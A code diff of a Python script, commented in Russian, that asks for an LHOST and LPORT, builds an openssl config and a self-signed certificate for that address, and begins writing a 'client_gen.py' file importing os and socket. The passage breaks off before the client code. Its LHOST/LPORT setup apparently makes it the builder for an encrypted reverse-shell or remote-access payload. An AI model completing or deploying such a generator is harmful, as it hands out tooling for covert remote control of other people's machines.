@@ -1,40 +1,40 @@
 import subprocess
+import os
 
-
-subprocess.run('ipconfig')
+subprocess.run('ifconfig')
 LHOST = str(input("LHOST= "))
 LPORT = str(input('LPORT= '))
 
-with open('openssl.cnf','w') as file:
-
+with open('openssl.cnf', 'w') as file:
     configSR = f'''
     [ req ]
     distinguished_name = req_distinguished_name
     x509_extensions = v3_req
     prompt = no
-    
+
     [ req_distinguished_name ]
     CN = {LHOST}  # IP-адрес вашего сервера
-    
+
     [ v3_req ]
     subjectAltName = @alt_names
-    
+
     [ alt_names ]
     IP.1 = {LHOST}  # IP-адрес вашего сервера
-    
+
     '''
     file.write(configSR)
 
 try:
-    subprocess.run('openssl genpkey -algorithm RSA -out server_key.pem')
-    subprocess.run('openssl req -new -key server_key.pem -out server_csr.pem -config openssl.cnf')
-    subprocess.run('openssl x509 -req -days 365 -in server_csr.pem -signkey server_key.pem -out server_cert.pem -extensions v3_req -extfile openssl.cnf')
+    os.system('openssl genpkey -algorithm RSA -out server_key.pem')
+    os.system('openssl req -new -key server_key.pem -out server_csr.pem -config openssl.cnf')
+    os.system(
+        'openssl x509 -req -days 365 -in server_csr.pem -signkey server_key.pem -out server_cert.pem -extensions v3_req -extfile openssl.cnf')
 except Exception as e:
     print(e)
 
 srv_cr = open('server_cert.pem', 'r')
 
-with open('client_gen.py','w') as client_gen:
+with open('client_gen.py', 'w') as client_gen:
     client = f'''
 import os
 import socket
